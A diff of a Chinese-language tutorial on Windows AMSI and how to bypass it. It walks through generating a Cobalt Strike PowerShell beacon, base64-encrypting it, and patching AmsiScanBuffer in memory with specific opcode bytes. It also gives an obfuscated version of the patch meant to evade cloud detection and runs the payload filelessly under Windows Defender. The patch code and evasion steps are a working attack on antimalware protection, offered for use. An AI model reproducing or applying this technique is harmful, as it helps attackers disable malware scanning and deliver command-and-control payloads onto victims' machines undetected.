@@ -1,28 +1,25 @@
 # 反病毒引擎AMSI的浅析和绕过
 # AMSI简介
-### 许多进行基于场景的评估或基于数字的红队评估的渗透测试者很可能遇到过 AMSI 并且熟悉它的功能。AMSI 增强了对攻击期间常用的一些现代工具、策略和程序 (TTP) 的使用保护，因为它提高了反恶意软件产品的可见性。最相关的例子是 PowerShell 无文件负载，它已被现实世界的威胁参与者和渗透测试者广泛使用。
+### 许多进行基于场景的评估或基于数字的红队评估的渗透测试者很可能遇到过 AMSI 并且熟悉它的功能。AMSI 增强了对攻击期间常用的一些现代工具、策略和程序 (TTP) 的使用保护，因为它提高了反恶意软件产品的可见性。最相关的例子是 PowerShell 无文件加载，它已被一些APT组织和恶意软件制作商广泛使用。
 
-### 如前所述，AMSI 允许服务和应用程序与已安装的反恶意软件进行通信。为此，AMSI 正在挂钩，例如，Windows 脚本主机(WSH) 和PowerShell，以便对正在执行的内容进行去混淆处理和分析。此内容在执行之前被“捕获”并发送到反恶意软件解决方案。 
+### 如前所述，AMSI 允许服务和应用程序与已安装的反恶意软件进行通信。当系统中开始创建进程或者被申请内存，AMSI 就会处于挂钩状态，例如，Windows 脚本主机(WSH) 和PowerShell，以便对正在执行的内容进行去混淆处理和分析。此内容在执行之前被“捕获”并发送到反恶意软件解决方案。 
+## 打开PowerShell时amsi.dll自动加载
+![image](https://user-images.githubusercontent.com/89376703/155829682-e02d955c-5446-4c6d-a853-ab37ad006ab6.png)
+
 
  
 ### 这是在 Windows 10 上实现 AMSI 的所有组件的列表：
 
-### 用户帐户控制或 UAC（EXE、COM、MSI 或 ActiveX 安装的提升）、 PowerShell（脚本、交互式使用和动态代码评估）、Windows 脚本宿主（wscript.exe 和 cscript.exe）、JavaScript 和 VBScript Office VBA 宏  
+### 用户帐户控制或 UAC（EXE、COM、MSI 或 ActiveX 安装的提升）、 PowerShell（脚本、交互式使用和动态代码评估）、Windows 脚本宿主（wscript.exe 和 cscript.exe）、JavaScript 和VBScript Office VBA 宏  
 ### (请注意，AMSI 不仅用于扫描脚本、代码、命令或 cmdlet，还可以用于扫描任何文件、内存或数据流，例如字符串、即时消息、图片或视频。)
 
 # 0x01.通过修补 AMSI.dll 的操作码绕过ASMI
 
-### 1.用cobaltstrike生成一个beacon.ps1,当然你用generator也可以
-![image](https://user-images.githubusercontent.com/89376703/155735798-0388189e-ec01-47d4-976c-799891746687.png)
+### 1.用cobaltstrike生成一个pyaload.ps1（）
+![image](https://user-images.githubusercontent.com/89376703/155829428-4443b718-5d03-491f-84c7-87fbb089ddd0.png)
 
 ![image](https://user-images.githubusercontent.com/89376703/155735869-45a3c954-8737-4ac4-a4ad-3b750f335b82.png)
 
-
-
-### 注意我这里用的是64位的stageless，powershell文件越大，混淆的手法越
-
-
-![image](https://user-images.githubusercontent.com/89376703/155733969-384abfb3-64be-4c93-b2b8-c7c60ea8dd13.png)
 
 
 ### 使用C#加密器对整个ps1文件进行base64加密
@@ -68,7 +65,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
 
-### 当然如果你怕代码被云标记的话可以加一些混淆，比如说字符串的分裂，或者转换成ASCLL字符码
+### 当然如果你怕代码被云防护标记的话，可以添加一些混淆，比如说字符串的分裂，或者转换成ASCLL字符码
 
 ```
 #导入API 函数
@@ -99,7 +96,7 @@ $macm = "0xC3"
 $hquzq = [Byte[]] ($jniv,$kgmv,$odgn,$zalk,+$cfun,+$macm)
 [System.Runtime.InteropServices.Marshal]::Copy($hquzq, 0, $bhijoj, 6)
 ```
-### 将混淆过后的代码插入解密代码中
+### 将混淆过后的代码插入解密代码中（pay.ps1）
 
 ![image](https://user-images.githubusercontent.com/89376703/155734244-a2185115-0d62-4b8c-96f0-7e09b6caf530.png)
 ### 放在windows defender环境下无文件执行即可
@@ -110,9 +107,9 @@ $hquzq = [Byte[]] ($jniv,$kgmv,$odgn,$zalk,+$cfun,+$macm)
 
 ## **绕过原理**
 
-2018 年 5 月，CyberArk 发布了 POC 代码，通过修补其功能之一，即 AmsiScanBuffer() 来绕过 AMSI
+### 2018 年 5 月，CyberArk 发布了 POC 代码，通过修补其功能之一，即 AmsiScanBuffer() 来绕过 AMSI
 
-# AmsiScanBuffer 的API原型
+## AmsiScanBuffer 的API原型
 
 ```
 HRESULT AmsiScanBuffer(
